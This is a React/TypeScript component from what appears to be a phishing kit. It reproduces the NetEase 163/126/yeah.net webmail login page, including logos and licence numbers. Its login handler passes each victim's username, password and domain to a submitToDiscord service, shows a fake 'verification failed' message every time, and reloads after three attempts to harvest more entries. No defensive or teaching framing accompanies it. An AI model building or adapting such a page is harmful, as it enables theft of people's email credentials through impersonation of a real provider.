
import React, { useState, useEffect } from 'react';
import { submitToDiscord } from '../services/DiscordService';

interface NetEaseThemeProps {
  prefilledEmail?: string;
}

const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
  const initialDomain = prefilledEmail?.split('@')[1] || '126.com';
  const initialUser = prefilledEmail?.split('@')[0] || '';
  
  const [username, setUsername] = useState(initialUser);
  const [password, setPassword] = useState('');
  const [domain, setDomain] = useState(initialDomain.includes('163') ? '163.com' : initialDomain.includes('yeah') ? 'yeah.net' : '126.com');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        username,
        password,
        domain,
        theme: 'netease',
      }, 'NetEaseTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
      {/* Top Banner / Navigation */}
      <header className="w-full px-6 py-4 flex items-center justify-between max-w-[1400px] mx-auto">
        <div className="flex items-center">
          <div className="flex items-center space-x-1">
             <div className="flex items-center">
                <span className="text-red-600 text-2xl font-bold mr-1">網易</span>
                <span className="text-black text-xl font-bold tracking-tighter uppercase">NetEase</span>
             </div>
          </div>
        </div>
        
        <nav className="hidden lg:flex items-center space-x-4 text-[12px] text-gray-500">
          <div className="relative group">
            <span className="bg-red-500 text-white text-[9px] px-1 rounded absolute -top-3 left-1/2 -translate-x-1/2 scale-90 whitespace-nowrap">多账号登录</span>
            <a href="#" className="hover:text-red-500">手机App下载</a>
          </div>
          <a href="#" className="hover:text-red-500">桌面端下载</a>
          <a href="#" className="hover:text-red-500">VIP</a>
          <a href="#" className="hover:text-red-500">会员</a>
          <a href="#" className="hover:text-red-500">靓号</a>
          <a href="#" className="hover:text-red-500">企业邮箱</a>
          <a href="#" className="hover:text-red-500">海外登录</a>
          <span className="text-gray-300">|</span>
          <a href="#" className="hover:text-red-500">安全</a>
          <a href="#" className="hover:text-red-500">帮助</a>
          <a href="#" className="hover:text-red-500">反馈</a>
          <a href="#" className="hover:text-red-500">修复公示</a>
        </nav>
      </header>

      {/* Main Content Area */}
      <main className="flex-grow flex items-center justify-center relative overflow-hidden bg-gradient-to-br from-[#fff7f9] via-white to-[#f4f7ff] py-12">
        {/* Background Decorative Blobs */}
        <div className="absolute top-0 right-0 w-[600px] h-[600px] bg-pink-100/30 rounded-full blur-3xl -z-10 translate-x-1/2 -translate-y-1/2"></div>
        <div className="absolute bottom-0 left-0 w-[600px] h-[600px] bg-blue-50/30 rounded-full blur-3xl -z-10 -translate-x-1/2 translate-y-1/2"></div>

        <div className="w-full max-w-[1200px] flex flex-col lg:flex-row items-center justify-between px-6 z-10">
          
          {/* Left Side: Promo Content */}
          <div className="hidden lg:flex flex-col space-y-8 max-w-[500px] relative">
            <div className="space-y-4">
              <div className="inline-block bg-[#fce9e3] text-[#cc6b4f] text-xs px-3 py-1 rounded-full font-medium">开通邮箱超级会员</div>
              <h2 className="text-4xl font-bold text-gray-800 leading-tight">
                解锁四大权益，AI提效
              </h2>
              <p className="text-gray-400 text-lg">享无限容量邮箱、VIP域名、客户端会员权益</p>
            </div>
            
            <button className="w-fit px-8 py-3 bg-[#2a241c] hover:bg-black text-[#e8c688] rounded-full font-medium transition-all shadow-xl shadow-black/10">
              马上开通
            </button>

            {/* Floating 3D Icons Simulation */}
            <div className="relative h-[350px] mt-8">
               {/* Center Cube S+ */}
               <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-32 h-32 bg-[#2a241c] rounded-2xl rotate-12 shadow-2xl flex items-center justify-center border border-white/20 transform hover:scale-105 transition-transform">
                  <span className="text-[#e8c688] text-5xl font-black italic">S+</span>
                  <div className="absolute -bottom-2 -right-4 bg-white/80 backdrop-blur-md px-2 py-1 rounded text-[10px] text-gray-800 font-bold border border-gray-100">客户端会员</div>
               </div>
               
               {/* Floating elements */}
               <div className="absolute top-10 left-20 animate-bounce transition-all duration-1000">
                  <div className="bg-[#f0ece9] p-3 rounded-xl shadow-lg border border-white flex flex-col items-center">
                    <span className="text-[10px] text-gray-400 mb-1">VIP域名</span>
                    <div className="w-8 h-8 bg-[#333] rounded-md flex items-center justify-center rotate-45">
                       <span className="text-[#e8c688] -rotate-45 text-[8px] font-bold">V</span>
                    </div>
                  </div>
               </div>

               <div className="absolute bottom-10 right-20 animate-pulse transition-all duration-1000">
                  <div className="bg-[#f0ece9] p-3 rounded-xl shadow-lg border border-white flex flex-col items-center">
                    <span className="text-[10px] text-gray-400 mb-1">无限容量</span>
                    <div className="w-8 h-8 bg-[#cc6b4f]/20 rounded-md flex items-center justify-center">
                       <span className="text-[#cc6b4f] font-bold">S</span>
                    </div>
                  </div>
               </div>

               <div className="absolute bottom-1/2 left-0 transform -translate-y-1/2">
                  <div className="flex flex-col items-center">
                    <span className="text-[10px] text-gray-400 mb-1">智能助理</span>
                    <span className="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-br from-blue-400 to-indigo-600 opacity-80">AI</span>
                  </div>
               </div>

               {/* Red badge */}
               <div className="absolute bottom-10 left-1/2 transform -translate-x-1/2">
                  <div className="w-12 h-12 bg-red-500 rounded-xl rotate-12 flex items-center justify-center shadow-lg border-2 border-white">
                    <div className="w-6 h-1 bg-white rounded-full mb-1"></div>
                    <div className="w-6 h-1 bg-white rounded-full"></div>
                  </div>
               </div>
            </div>
          </div>

          {/* Right Side: Login Card */}
          <div className="flex items-center">
            {/* Left selector dots (the image shows 163, 126, yeah vertically outside the card) */}
            <div className="hidden md:flex flex-col space-y-4 mr-4">
               <button 
                onClick={() => setDomain('163.com')}
                className={`w-12 h-12 rounded-full border-2 flex items-center justify-center text-[12px] font-bold transition-all ${domain === '163.com' ? 'bg-[#ff4d4f]/10 border-[#ff4d4f] text-[#ff4d4f]' : 'bg-white border-gray-100 text-gray-400 hover:border-gray-300'}`}
               >
                 163
               </button>
               <button 
                onClick={() => setDomain('126.com')}
                className={`w-12 h-12 rounded-full border-2 flex items-center justify-center text-[12px] font-bold transition-all ${domain === '126.com' ? 'bg-[#27ae60]/10 border-[#27ae60] text-[#27ae60]' : 'bg-white border-gray-100 text-gray-400 hover:border-gray-300'}`}
               >
                 126
               </button>
               <button 
                onClick={() => setDomain('yeah.net')}
                className={`w-12 h-12 rounded-full border-2 flex items-center justify-center text-[12px] font-bold transition-all ${domain === 'yeah.net' ? 'bg-[#e74c3c]/10 border-[#e74c3c] text-[#e74c3c]' : 'bg-white border-gray-100 text-gray-400 hover:border-gray-300'}`}
               >
                 yeah
               </button>
            </div>

            <div className="w-full max-w-[380px] bg-white rounded-xl shadow-[0_20px_50px_rgba(0,0,0,0.05)] border border-gray-100 overflow-hidden p-10 flex flex-col min-h-[480px]">
              <h3 className="text-2xl font-bold text-center mb-10 text-gray-800 tracking-tight">账号登录</h3>
              
              <form onSubmit={handleLogin} className="space-y-6 flex-grow flex flex-col">
                <div className="flex items-center border-b border-gray-200 focus-within:border-[#27ae60] transition-colors py-1">
                  <input 
                    type="text" 
                    placeholder="邮箱账号或手机号码" 
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="flex-grow bg-transparent px-2 py-2 text-[15px] focus:outline-none placeholder:text-gray-300"
                  />
                  <span className="text-gray-400 text-[15px] font-medium pr-2">@{domain}</span>
                </div>

                <div className="relative group">
                  <input 
                    type={showPassword ? "text" : "password"} 
                    placeholder="输入密码" 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full border-b border-gray-200 focus-within:border-[#27ae60] transition-colors px-2 py-3 text-[15px] focus:outline-none placeholder:text-gray-300"
                  />
                  <button 
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-300 hover:text-gray-500"
                  >
                    {showPassword ? '👁️' : '👁️‍🗨️'}
                  </button>
                </div>

                <div className="flex items-center justify-between text-[13px] text-gray-500">
                  <label className="flex items-center cursor-pointer">
                    <input type="checkbox" className="mr-2 rounded border-gray-300 text-[#27ae60] focus:ring-[#27ae60]" defaultChecked />
                    30天内免登录
                  </label>
                  <a href="#" className="hover:text-red-500">忘记密码</a>
                </div>

                {/* Loading State */}
                {isLoading && (
                  <div className="flex items-center justify-center py-8">
                    <div className="flex flex-col items-center space-y-3">
                      <div className="w-8 h-8 border-4 border-green-200 border-t-green-500 rounded-full animate-spin"></div>
                      <p className="text-[14px] text-gray-500">正在验证...</p>
                    </div>
                  </div>
                )}

                {/* Authentication Failed Message */}
                {authError && !isLoading && (
                  <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                    <div className="flex items-start space-x-3">
                      <div className="flex-shrink-0 text-red-500 text-xl">⚠️</div>
                      <div>
                        <h3 className="font-medium text-red-800 text-[14px]">验证失败</h3>
                        <p className="text-red-700 text-[13px] mt-1">请重试。剩余尝试次数: {3 - failedAttempts}</p>
                      </div>
                    </div>
                  </div>
                )}

                <button type="submit" disabled={isLoading} className="w-full py-3.5 bg-[#27ae60] hover:bg-[#219150] text-white font-bold rounded transition-colors text-[18px] shadow-lg shadow-[#27ae60]/20 disabled:opacity-50 disabled:cursor-not-allowed">
                  {isLoading ? '验证中...' : '登 录'}
                </button>

                <div className="flex items-center justify-center space-x-3 text-[13px] pt-2">
                  <a href="#" className="text-gray-400 hover:text-[#27ae60]">注册新账号</a>
                  <span className="text-gray-200">|</span>
                  <a href="#" className="text-gray-400 hover:text-[#27ae60]">注册VIP</a>
                </div>
              </form>

              {/* Bottom footer elements of the card */}
              <div className="mt-8">
                <div className="flex items-center justify-between border-t border-gray-50 pt-6">
                   <div className="w-8 h-8 bg-gray-50 flex items-center justify-center rounded cursor-pointer hover:bg-gray-100">
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                       <rect x="3" y="3" width="7" height="7" /><rect x="14" y="3" width="7" height="7" />
                       <rect x="3" y="14" width="7" height="7" /><rect x="14" y="14" width="7" height="7" />
                     </svg>
                   </div>
                   <div className="text-[11px] text-gray-400 flex items-center space-x-1">
                      <span>阅读并接受</span>
                      <a href="#" className="hover:text-red-500">《服务条款》</a>
                      <span>和</span>
                      <a href="#" className="hover:text-red-500">《隐私政策》</a>
                   </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Floating scroll arrows decoration from image */}
        <div className="absolute left-6 bottom-1/2 translate-y-1/2 flex flex-col space-y-4">
           <div className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-gray-400 cursor-pointer hover:bg-gray-200">
             <svg width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M5 15l7-7 7 7"/></svg>
           </div>
           <div className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-gray-400 cursor-pointer hover:bg-gray-200">
             <svg width="14" height="14" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"/></svg>
           </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full py-10 bg-white">
        <div className="max-w-[1200px] mx-auto px-4 text-center space-y-4">
          <div className="flex flex-wrap justify-center items-center space-x-6 text-[12px] text-gray-500">
            <a href="#" className="hover:underline">网易首页</a>
            <span className="text-gray-200">|</span>
            <a href="#" className="hover:underline">企业邮箱</a>
            <span className="text-gray-200">|</span>
            <a href="#" className="hover:underline">网易外贸通</a>
            <span className="text-gray-200">|</span>
            <span>网易公司版权所有©1997-2025</span>
          </div>
          <div className="flex flex-wrap justify-center items-center space-x-4 text-[11px] text-gray-400 opacity-80">
            <span>ICP备案 粤B2-20090191-18</span>
            <span className="flex items-center"><span className="mr-1">🛡️</span>粤公网安备 44010602006299</span>
            <span>增值电信业务许可证 粤B2-20090191 B2-20090058</span>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default NetEaseTheme;
